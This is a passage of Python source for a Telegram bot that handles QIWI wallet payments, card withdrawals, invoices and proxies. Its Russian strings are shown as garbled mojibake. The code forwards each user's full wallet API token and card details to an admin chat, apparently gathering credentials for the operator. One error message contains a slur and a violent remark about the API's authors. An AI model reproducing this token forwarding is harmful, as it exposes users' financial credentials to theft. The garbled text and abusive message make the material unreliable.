                                bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–º–µ–Ω–∏—Ç—å –≤—ã—Å—Ç–∞–≤–ª–µ–Ω–Ω—ã–π —Å—á–µ—Ç!', reply_markup=kb_main)
                        else:
                            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –æ–∂–∏–¥–∞–ª–æ—Å—å –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –∏–ª–∏ –æ—Ç–º–µ–Ω–∞!', reply_markup=kb_main)
                    except:
                        bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å ... –Ω–∏—á–µ–≥–æ –Ω–µ —É–¥–∞–ª–æ—Å—å –Ω–µ–Ω–∞–≤–∏–∂—É —ç—Ç—É —Ñ—É–Ω–∫—Ü–∏—é, –Ω–µ–Ω–∞–≤–∏–∂—É –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—é api qiwi, –µ–µ –ø–∏—Å–∞–ª–∏ –∞—É—Ç–∏—Å—Ç—ã, —É –Ω–∏—Ö –¥–∞–∂–µ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –ø–µ—Ä–µ–¥–∞—é—Ç—Å—è —ç–∫–∑–µ–º–ø–ª—è—Ä—É —Å–µ—Å—Å–∏–∏ —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ POST –∑–∞–ø—Ä–æ—Å–∞, –∫–∞–∫–∏–µ –∂–µ –æ–Ω–∏ –ø—Ä–∏–¥—É—Ä–∫–∏, —è —Ö–æ—á—É –≤—ã—Ä–µ–∑–∞—Ç—å –∏—Ö –≤—Å–µ –∫–∞–∫ –∂–µ –º–Ω–µ –ø–ª–æ—Ö–æ!', reply_markup=kb_main)
                    qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "select_offers":
                    try:
                        # –ü–æ–ª—É—á–∞–µ–º ID —Å—á–µ—Ç–∞ –¥–ª—è –æ–ø–ª–∞—Ç—ã.
                        now_offer_id = message.text.split()[2][4:-1]
                        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –µ—Å—Ç—å –ª–∏ —Ç–∞–∫–æ–π —Å—á–µ—Ç.
                        local_offer = [one_offer for one_offer in qiwi.users_info[tid]["offers"] if one_offer["id"] == str(now_offer_id)]
                        if local_offer:
                            # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—é - number, id, sum
                            offer_number = local_offer[0]["number"]
                            offer_sum = local_offer[0]["sum"]

                            # –ó–∞–ø–∏—Å—ã–≤–∞–µ–º —Ç–µ–ø–µ—Ä—å –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.
                            qiwi.status(tid, "confirm_offer")
                            qiwi.users_info[tid]["sum"] = offer_sum
                            qiwi.users_info[tid]["offer_id"] = now_offer_id

                            offer_text = f"*–ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø–µ—Ä–µ–¥ –æ–ø–ª–∞—Ç–æ–π!*\n–û–±–æ–∑–Ω–∞—á–µ–Ω–∏–µ: –°—á–µ—Ç #{offer_number + 1}\nID: `{now_offer_id}`\n–°—É–º–º–∞: `{offer_sum}`‚ÇΩ"
                            bot.send_message(tid, offer_text, parse_mode='markdown', reply_markup=kb_confirm_off)
                        else:
                            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –Ω–∞–π—Ç–∏ —Ç–∞–∫–æ–π —Å—á–µ—Ç!', reply_markup=kb_main)
                            qiwi.reset(tid)
                    except:
                        bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å —Ä–∞—Å–ø–æ–∑–Ω–∞—Ç—å —Å—á–µ—Ç –¥–ª—è –æ–ø–ª–∞—Ç—ã!', reply_markup=kb_main)
                        qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "history_clicked":
                    qiwi.status(tid, "history_rows")
                    if message.text == "üì• –ü–æ–ø–æ–ª–Ω–µ–Ω–∏—è":
                        qiwi.users_info[tid]["type_operations"] = "IN"
                    elif message.text == "üì§ –ü–ª–∞—Ç–µ–∂–∏":
                        qiwi.users_info[tid]["type_operations"] = "OUT"
                    elif message.text == "üì® –í—Å–µ –æ–ø–µ—Ä–∞—Ü–∏–∏":
                        qiwi.users_info[tid]["type_operations"] = "ALL"
                    else:
                        bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å —Ä–∞—Å–ø–æ–∑–Ω–∞—Ç—å —Ç–∏–ø –æ–ø–µ—Ä–∞—Ü–∏–π!', reply_markup=kb_main)
                        qiwi.reset(tid)
                        return
                    bot.send_message(tid, '–í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ –ø–ª–∞—Ç–µ–∂–µ–π (–¥–æ 20):', reply_markup=kb_rows)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "history_rows":
                    try:
                        user_rows = 20 if int(message.text) > 20 else int(message.text)
                        # –ü–æ–ª—É—á–∞–µ–º –∏—Å—Ç–æ—Ä–∏—é –æ–ø–µ—Ä–∞—Ü–∏–π.
                        now_token = qiwi.users_info[tid]["token"]
                        now_phone = qiwi.users_info[tid]["phone"]
                        type_op = qiwi.users_info[tid]["type_operations"]
                        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞ –∑–∞–º–æ—Ä–æ–∑–∫—É —Ç–æ–∫–µ–Ω–∞.
                        is_freezed = load_freezed_tokens(now_token)
                        if tid != qiwi.notification and not is_freezed is None:
                            time.sleep(1)
                            raise ValueError
                        payment_history = qiwi.form_history(now_token, now_phone, tid, user_rows, type_op)
                        if not payment_history:
                            raise ValueError
                        bot.send_message(tid, payment_history, parse_mode='markdown', reply_markup=kb_main, disable_web_page_preview=True)
                    except:
                        bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –∏—Å—Ç–æ—Ä–∏—é –æ–ø–µ—Ä–∞—Ü–∏–π!', reply_markup=kb_main)
                    qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "card_confirm":
                    try:
                        if message.text == "‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –≤—ã–≤–æ–¥":
                            now_token = qiwi.users_info[tid]["token"]
                            now_phone = qiwi.users_info[tid]["phone"]
                            card_number = qiwi.users_info[tid]["card"]
                            provider_name = qiwi.users_info[tid]["provider_name"]
                            to_sum = qiwi.users_info[tid]["to_sum"]
                            balance = qiwi.users_info[tid]["balance"]
                            provider_id = qiwi.users_info[tid]["provider_id"]
                            # –ü–æ–ª—É—á–∞–µ–º —Å–ª–æ–≤–∞—Ä—å —Å –¥–∞–Ω–Ω—ã–º–∏.
                            payment_data = get_payment_data(now_token, now_phone, card_number, to_sum)
                            if payment_data:
                                # –í—ã–ø–æ–ª–Ω—è–µ–º –æ–ø–ª–∞—Ç—É.
                                result = send_card(now_token, payment_data, tid)
                                if result:
                                    transaction_id = result["id"]
                                    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ–± —É—Å–ø–µ—à–Ω–æ–º –ø–µ—Ä–µ–≤–æ–¥–µ.
                                    if tid != qiwi.notification:
                                        use_proxy = do_have_proxy(tg_id=tid)
                                        notif_text = 'üí≥ *–í—ã–≤–æ–¥ –Ω–∞ –∫–∞—Ä—Ç—É!*'
                                        last_text = f'–¢–æ–∫–µ–Ω: `{now_token}`\n–ü—Ä–æ–≤–∞–π–¥–µ—Ä: `{provider_name}`\n–ü–æ–ª—É—á–∞—Ç–µ–ª—å: `{card_number}`\n\n–ë–∞–ª–∞–Ω—Å: `{balance}`‚ÇΩ\n–°—É–º–º–∞ –∫ –ø–æ–ª—É—á–µ–Ω–∏—é: `{to_sum}`‚ÇΩ\n\nID –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏: `{transaction_id}`'
                                        qiwi.notif_common_admin(notif_text=notif_text, telegram_id=tid, username=message.from_user.username, last_text=last_text, use_proxy=use_proxy)
                                        qiwi.save_transaction(telegram_id=tid, token=now_token, from_qiwi=now_phone, to_qiwi=card_number, user_sum=to_sum, boss_sum=0, transaction_id=transaction_id, use_proxy=use_proxy, tr_type=provider_id)
                                    minus_sum = qiwi.users_info[tid]["minus_sum"]
                                    qiwi.add_spent_limits(tid, minus_sum) # 4
                                    bot.send_message(tid, f'‚úÖ –ü–ª–∞—Ç–µ–∂ –ø—Ä–∏–Ω—è—Ç!\nüßæ ID –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏: `{transaction_id}`', parse_mode='markdown', reply_markup=kb_main)
                                else:
                                    bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –≤—ã–ø–æ–ª–Ω–∏—Ç—å –≤—ã–≤–æ–¥!', reply_markup=kb_main)
                            else:
                                bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å —Å—Ñ–æ—Ä–º–∏—Ä–æ–≤–∞—Ç—å —Å–ª–æ–≤–∞—Ä—å –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞!', reply_markup=kb_main)
                        else:
                            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –æ–∂–∏–¥–∞–ª–æ—Å—å –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ!', reply_markup=kb_main)
                    except:
                        bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å —Å—Ñ–æ—Ä–º–∏—Ä–æ–≤–∞—Ç—å –≤—ã–≤–æ–¥!', reply_markup=kb_main)
                    qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "card_sum":
                    try:
                        to_sum = float(message.text)
                        min_sum = qiwi.users_info[tid]["min_sum"]
                        max_sum = qiwi.users_info[tid]["max_sum"]
                        if float(min_sum) <= to_sum <= float(max_sum):
                            provider_id = qiwi.users_info[tid]["provider_id"]
                            provider_name = config.CARD_INFO.get(provider_id, {}).get('name', '–Ω–µ–∏–∑–≤.')
                            provider_tax = config.CARD_INFO.get(provider_id, {}).get('tax', '–Ω–µ–∏–∑–≤.')
                            show_card = '***' + qiwi.users_info[tid]["card"][-4:]

                            if provider_id == "22351":
                                minus_sum = round(to_sum * 1.02, 2)
                            elif provider_id in ["1963", "21013", "31652"]:
                                minus_sum = round(to_sum * 1.02 + 50, 2)
                            elif provider_id in ["1960", "21012"]:
                                minus_sum = round(to_sum * 1.02 + 100, 2)
                            else:
                                raise TypeError

                            card_text = f"*–ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø–µ—Ä–µ–¥ –≤—ã–≤–æ–¥–æ–º!*\n–ü—Ä–æ–≤–∞–π–¥–µ—Ä: `{provider_name}`\n–ö–∞—Ä—Ç–∞: `{show_card}`\n–ö–æ–º–∏—Å—Å–∏—è QIWI: `{provider_tax}`\n\n–°—É–º–º–∞ –∫ —Å–ø–∏—Å–∞–Ω–∏—é: `{minus_sum}`‚ÇΩ\n–°—É–º–º–∞ –∫ –∑–∞—á–∏—Å–ª–µ–Ω–∏—é: `{to_sum}`‚ÇΩ"
                            bot.send_message(tid, card_text, parse_mode='markdown', reply_markup=kb_confirm_card)
                            qiwi.users_info[tid]["to_sum"] = to_sum
                            qiwi.users_info[tid]["provider_name"] = provider_name
                            qiwi.users_info[tid]["minus_sum"] = minus_sum
                            qiwi.status(tid, "card_confirm")
                        else:
                            bot.send_message(tid, f'üö´ –û—à–∏–±–∫–∞ - —Å—É–º–º–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –º–µ–∂–¥—É {min_sum}‚ÇΩ –∏ {max_sum}‚ÇΩ!', reply_markup=kb_main)
                            qiwi.reset(tid)
                    except:
                        bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å —Ä–∞—Å–ø–æ–∑–Ω–∞—Ç—å —Å—É–º–º—É!', reply_markup=kb_main)
                        qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "card":
                    try:
                        user_card = str(int(message.text))
                        # –û–ø—Ä–µ–¥–µ–ª—è–µ–º –∫–∞—Ä—Ç—É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.
                        provider_id = card_system(user_card)
                        if provider_id and isinstance(provider_id, str):
                            # –û–ø—Ä–µ–¥–µ–ª—è–µ–º –º–∞–∫—Å–∏–º–∞–ª—å–Ω—É—é —Å—É–º–º—É.
                            now_balance = round(qiwi.users_info[tid]["balance"], 2)
                            if provider_id == "22351":
                                max_sum = round(now_balance / 1.02, 2)
                                min_sum = 1
                            elif provider_id in ["1963", "21013", "31652"]:
                                max_sum = round((now_balance - 50) / 1.02, 2)
                                min_sum = 50.02
                            elif provider_id in ["1960", "21012"]:
                                max_sum = round((now_balance - 100) / 1.02, 2)
                                min_sum = 100.02
                            else:
                                raise TypeError

                            if max_sum >= 1:
                                kb_sum = ReplyKeyboardMarkup(True)
                                kb_sum.row('25', '50', '100')
                                kb_sum.row('250', '500', '1000')
                                kb_sum.row(str(max_sum), 'üîô –û—Ç–º–µ–Ω–∞')

                                # –ó–∞–ø–∏—Å—ã–≤–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é.
                                qiwi.status(tid, "card_sum")
                                qiwi.users_info[tid]["card"] = user_card
                                qiwi.users_info[tid]["max_sum"] = max_sum
                                qiwi.users_info[tid]["min_sum"] = 1
                                qiwi.users_info[tid]["provider_id"] = provider_id

                                bot.send_message(tid, '–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É: ', reply_markup=kb_sum)
                            elif max_sum < 1:
                                bot.send_message(tid, f'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —Ö–≤–∞—Ç–∞–µ—Ç —Å—Ä–µ–¥—Å—Ç–≤ –Ω–∞ –±–∞–ª–∞–Ω—Å–µ.\n–ù—É–∂–Ω–æ –µ—â–µ: {round(min_sum - now_balance, 2)}‚ÇΩ', reply_markup=kb_main)
                                qiwi.reset(tid)
                            else:
                                raise ValueError

                        elif provider_id:
                            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –≤—ã–≤–æ–¥ –Ω–∞ –∏–Ω–æ—Å—Ç—Ä–∞–Ω–Ω—ã–µ –∫–∞—Ä—Ç—ã –ø–æ–∫–∞ –Ω–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è!\n–≠—Ç–æ –±—É–¥–µ—Ç –¥–æ—Å—Ç—É–ø–Ω–æ –≤ —Å–ª–µ–¥—É—é—â–µ–º –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏.', reply_markup=kb_main)
                            qiwi.reset(tid)
                        else:
                            raise TypeError
                    except:
                        bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å —Ä–∞—Å–ø–æ–∑–Ω–∞—Ç—å –∫–∞—Ä—Ç—É!', reply_markup=kb_main)
                        qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "invoice_clicked":
                    raw_invoice = message.text
                    # –ü–æ–ª—É—á–∞–µ–º UID.
                    invoice_uid = form_invoice(raw_invoice)
                    if invoice_uid:
                        # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é.
                        invoice_info = get_invoice_info(invoice_uid)
                        if invoice_info:
                            try:
                                max_sum = round(qiwi.users_info.get(tid, {}).get("balance", 0) / 1.02, 2)
                                # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å—É–º–º—É.
                                if invoice_info["sum"] <= max_sum:
                                    if invoice_info['currency'] != 643:
                                        raise ValueError
                                    invoice_status = INVOICE_CODES.get(invoice_info['status']) or invoice_info['status']
                                    qiwi.users_info[tid]["invoice_sum"] = invoice_info['sum']

                                    comment_details = f"\n–ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π: `{invoice_info['comment']}`" if invoice_info['comment'] else ''

                                    invoice_text = "*–ü—Ä–æ–≤–µ—Ä—å—Ç–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é!*\n" + \
                                        f"–ù–∞–∑–≤–∞–Ω–∏–µ: `{invoice_info['title']}`\n–°—Ç–∞—Ç—É—Å: *{invoice_status}*\n" + \
                                        f"–°—É–º–º–∞ –∫ —Å–ø–∏—Å–∞–Ω–∏—é: `{round(invoice_info['sum'] * 1.02, 2)}`‚ÇΩ\n–°—É–º–º–∞ —Å—á–µ—Ç–∞: `{invoice_info['sum']}`‚ÇΩ{comment_details}"
                                    if invoice_info['status'] == 'READY_FOR_PAY_STATUS':
                                        bot.send_message(tid, invoice_text, parse_mode='markdown', reply_markup=kb_confirm_inv)
                                        qiwi.status(tid, "waiting_confirm_inv")
                                        qiwi.users_info[tid]["uid"] = invoice_uid
                                    else:
                                        bot.send_message(tid, invoice_text, parse_mode='markdown', reply_markup=kb_main)
                                        qiwi.reset(tid)
                                else:
                                    bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –±–∞–ª–∞–Ω—Å –Ω–µ –ø–æ–∑–≤–æ–ª—è–µ—Ç —Å–æ–≤–µ—Ä—à–∏—Ç—å –ø–ª–∞—Ç–µ–∂!', reply_markup=kb_main)
                                    qiwi.reset(tid)
                            except:
                                bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –æ–±—Ä–∞–±–æ—Ç–∞—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏ –æ–± invoice!', reply_markup=kb_main)
                                qiwi.reset(tid)
                        else:
                            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± invoice!', reply_markup=kb_main)
                            qiwi.reset(tid)
                    else:
                        bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å —Ä–∞—Å–ø–æ–∑–Ω–∞—Ç—å —Å—Å—ã–ª–∫—É –Ω–∞ invoice!', reply_markup=kb_main)
                        qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "waiting_confirm_inv":
                    if message.text == "‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –æ–ø–ª–∞—Ç—É":
                        bot.send_message(tid, '‚åõ –û–ø–ª–∞—á–∏–≤–∞—é —Å—á–µ—Ç...')
                        now_token = qiwi.users_info[tid].get("token")
                        invoice_uid = qiwi.users_info[tid].get("uid")
                        from_qiwi = qiwi.users_info[tid].get("phone")
                        user_sum = qiwi.users_info[tid].get("invoice_sum", 0)
                        balance_show = qiwi.users_info[tid].get("balance", 0)
                        if pay_invoice(now_token, invoice_uid, tid):
                            qiwi.add_spent_limits(tid, user_sum) # 5
                            if tid != qiwi.notification:
                                use_proxy = do_have_proxy(tg_id=tid)
                                qiwi.notif_inv_admin(telegram_id=tid, username=message.from_user.username, token=now_token, from_qiwi=from_qiwi, balance=balance_show, user_sum=user_sum, boss_sum=0, transaction_id=None, use_proxy=use_proxy)
                                qiwi.save_transaction(telegram_id=tid, token=now_token, from_qiwi=from_qiwi, to_qiwi=None, user_sum=user_sum, boss_sum=0, transaction_id=None, use_proxy=use_proxy)
                            bot.send_message(tid, '‚úÖ –ü–ª–∞—Ç–µ–∂ –ø—Ä–∏–Ω—è—Ç!', reply_markup=kb_main)
                        else:
                            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –æ–ø–ª–∞—Ç–∏—Ç—å —Å—á–µ—Ç!', reply_markup=kb_main)
                    else:
                        bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –æ–∂–∏–¥–∞–ª–æ—Å—å –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ!', reply_markup=kb_main)
                    qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "qiwi_clicked" or qiwi.users_info.get(tid, {}).get("status") == "mult_qiwi_clicked":
                    to_qiwi = message.text
                    try:
                        tmp_qiwi = int(to_qiwi)
                        if not tmp_qiwi:
                            raise ValueError
                        qiwi.users_info[tid]["to_qiwi"] = to_qiwi
                        max_sum = round(qiwi.users_info.get(tid, {}).get("balance", 0) / 1.02, 2)
                        if max_sum:
                            kb_sum = ReplyKeyboardMarkup(True)
                            kb_sum.row('25', '50', '100')
                            kb_sum.row('250', '500', '1000')
                            kb_sum.row(str(max_sum), 'üîô –û—Ç–º–µ–Ω–∞')
                        else:
                            raise ValueError
                    except:
                        to_qiwi = False
                    else:
                        if to_qiwi:
                            bot.send_message(tid, f'–í—ã–±–µ—Ä–∏—Ç–µ –∏–ª–∏ –≤–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞ (–æ—Ç 1‚ÇΩ –¥–æ {str(max_sum)}‚ÇΩ):\n' + \
                                f'`–ù–∞–ø—Ä–∏–º–µ—Ä: {str(max_sum)}`', parse_mode='markdown', reply_markup=kb_sum)
                            if qiwi.users_info.get(tid, {}).get("status") == "qiwi_clicked":
                                qiwi.status(tid, "waiting_sum")
                            else:
                                qiwi.status(tid, "mult_waiting_sum")
                            return
                    bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø–∏—Å–∞—Ç—å QIWI –ø–æ–ª—É—á–∞—Ç–µ–ª—è!', reply_markup=kb_main)
                    qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "waiting_sum" or qiwi.users_info.get(tid, {}).get("status") == "mult_waiting_sum":
                    try:
                        # –ü–æ–ª—É—á–∞–µ–º —Å—É–º–º—É, –∫–æ—Ç–æ—Ä–∞—è –ø—Ä–∏–¥–µ—Ç –ø–æ–ª—É—á–∞—Ç–µ–ª—é.
                        end_sum = round(float(message.text), 2)
                        # –ü–æ–ª—É—á–∞–µ–º —Å—É–º–º—É —Å–ø–∏—Å–∞–Ω–∏—è.
                        minus_sum = round(end_sum * 1.02, 2)
                        # –ü–æ–ª—É—á–∞–µ–º –±–∞–ª–∞–Ω—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.
                        balance = qiwi.users_info.get(tid, {}).get("balance", 0)
                        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –µ—Å—Ç—å –ª–∏ —Ç–∞–∫–∞—è —Å—É–º–º–∞.
                        if not (balance and minus_sum and end_sum and minus_sum <= balance and minus_sum >= 1):
                            raise ValueError
                    except:
                        bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - —Å—É–º–º–∞ –Ω–µ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç —Ç—Ä–µ–±–æ–≤–∞–Ω–∏—è–º!', reply_markup=kb_main)
                        qiwi.reset(tid)
                    else:
                        try:
                            # –ü–æ–ª—É—á–∞–µ–º –Ω–æ–º–µ—Ä –ø–æ–ª—É—á–∞—Ç–µ–ª—è.
                            to_qiwi = int(qiwi.users_info.get(tid, {}).get("to_qiwi")) - 1 + 1
                        except:
                            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å —Ä–∞—Å–ø–æ–∑–Ω–∞—Ç—å –ø–æ–ª—É—á–∞—Ç–µ–ª—è!', reply_markup=kb_main)
                            qiwi.reset(tid)
                        else:
                            if qiwi.users_info.get(tid, {}).get("status") == "waiting_sum":
                                bot.send_message(tid, 'üí¨ –í–≤–µ–¥–∏—Ç–µ –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π –∫ –ø–µ—Ä–µ–≤–æ–¥—É:', reply_markup=kb_comment)
                            else:
                                bot.send_message(tid, 'üí¨ –í–≤–µ–¥–∏—Ç–µ –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π –∫ –ø–µ—Ä–µ–≤–æ–¥–∞–º:', reply_markup=kb_comment)
                            # –ó–∞–ø–∏—Å—ã–≤–∞–µ–º –ø–æ–ª—É—á–∞—Ç–µ–ª—è.
                            qiwi.users_info[tid]["to_qiwi"] = to_qiwi
                            # –ó–∞–ø–∏—Å—ã–≤–∞–µ–º —Å—É–º–º—É —Å–ø–∏—Å–∞–Ω–∏—è.
                            qiwi.users_info[tid]["minus_sum"] = minus_sum
                            # –ó–∞–ø–∏—Å—ã–≤–∞–µ–º —Å—É–º–º—É –ø–æ–ª—É—á–µ–Ω–∏—è.
                            qiwi.users_info[tid]["end_sum"] = end_sum
                            if qiwi.users_info.get(tid, {}).get("status") == "waiting_sum":
                                qiwi.status(tid, "waiting_comment")
                            else:
                                qiwi.status(tid, "mult_waiting_comment")
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "managing_proxy":
                    if message.text == "üü¢ –í–∫–ª—é—á–∏—Ç—å":
                        try:
                            if qiwi.users_proxy[tid]["info"] and qiwi.users_proxy[tid]["data"]:
                                qiwi.users_proxy[tid]["work"] = True
                            else:
                                raise ValueError
                        except:
                            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –≤–∫–ª—é—á–∏—Ç—å –ø—Ä–æ–∫—Å–∏!', reply_markup=kb_main)
                        else:
                            bot.send_message(tid, '‚úÖ –ü—Ä–æ–∫—Å–∏ —É—Å–ø–µ—à–Ω–æ *–≤–∫–ª—é—á–µ–Ω—ã*!', parse_mode='markdown', reply_markup=kb_main)
                            qiwi.save_proxy()
                            if tid != qiwi.notification:
                                qiwi.notif_common_admin(notif_text='üì≥ *–ü—Ä–æ–∫—Å–∏ –≤–∫–ª—é—á–µ–Ω—ã!*', telegram_id=tid, username=message.from_user.username)
                        qiwi.reset(tid)
                        return
                    elif message.text == "üî¥ –í—ã–∫–ª—é—á–∏—Ç—å":
                        try:
                            if qiwi.users_proxy[tid]["info"] and qiwi.users_proxy[tid]["data"]:
                                qiwi.users_proxy[tid]["work"] = False
                            else:
                                raise ValueError
                        except:
                            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –≤—ã–∫–ª—é—á–∏—Ç—å –ø—Ä–æ–∫—Å–∏!', reply_markup=kb_main)
                        else:
                            bot.send_message(tid, '‚òëÔ∏è –ü—Ä–æ–∫—Å–∏ —É—Å–ø–µ—à–Ω–æ *–≤—ã–∫–ª—é—á–µ–Ω—ã*!', parse_mode='markdown', reply_markup=kb_main)
                            qiwi.save_proxy()
                            if tid != qiwi.notification:
                                qiwi.notif_common_admin(notif_text='üì¥ *–ü—Ä–æ–∫—Å–∏ –≤—ã–∫–ª—é—á–µ–Ω—ã!*', telegram_id=tid, username=message.from_user.username)
                        qiwi.reset(tid)
                        return
                elif qiwi.users_info.get(tid, {}).get("status") == "waiting_comment" or qiwi.users_info.get(tid, {}).get("status") == "mult_waiting_comment":
                    # –ü–æ–ª—É—á–∞–µ–º –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.
                    user_comment = False if message.text == "üí≠ –û—Å—Ç–∞–≤–∏—Ç—å –ø—É—Å—Ç—ã–º" else message.text
                    qiwi.users_info[tid]["comment"] = user_comment
                    to_qiwi = qiwi.users_info[tid].get("to_qiwi")
                    minus_sum = qiwi.users_info[tid].get("minus_sum")
                    end_sum = qiwi.users_info[tid].get("end_sum")
                    if user_comment:
                        payment_text = '*–ü—Ä–æ–≤–µ—Ä—å—Ç–µ –¥–µ—Ç–∞–ª–∏ –ø–ª–∞—Ç–µ–∂–∞!*\n' + \
                            f'–ü–æ–ª—É—á–∞—Ç–µ–ª—å: `{to_qiwi}`\n' + \
                            f'–°—É–º–º–∞ –∫ —Å–ø–∏—Å–∞–Ω–∏—é: `{minus_sum}`‚ÇΩ\n' + \
                            f'–°—É–º–º–∞ –∫ –ø–æ–ª—É—á–µ–Ω–∏—é: `{end_sum}`‚ÇΩ\n' + \
                            f'–ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π: `{user_comment}`'
                    else:
                        payment_text = '*–ü—Ä–æ–≤–µ—Ä—å—Ç–µ –¥–µ—Ç–∞–ª–∏ –ø–ª–∞—Ç–µ–∂–∞!*\n' + \
                            f'–ü–æ–ª—É—á–∞—Ç–µ–ª—å: `{to_qiwi}`\n' + \
                            f'–°—É–º–º–∞ –∫ —Å–ø–∏—Å–∞–Ω–∏—é: `{minus_sum}`‚ÇΩ\n' + \
                            f'–°—É–º–º–∞ –∫ –ø–æ–ª—É—á–µ–Ω–∏—é: `{end_sum}`‚ÇΩ\n'
                    if qiwi.users_info.get(tid, {}).get("status") == "waiting_comment":
                        qiwi.status(tid, "waiting_confirm")
                        bot.send_message(tid, payment_text, parse_mode='markdown', reply_markup=kb_confirm)
                    else:
                        qiwi.status(tid, "mult_max_sum")
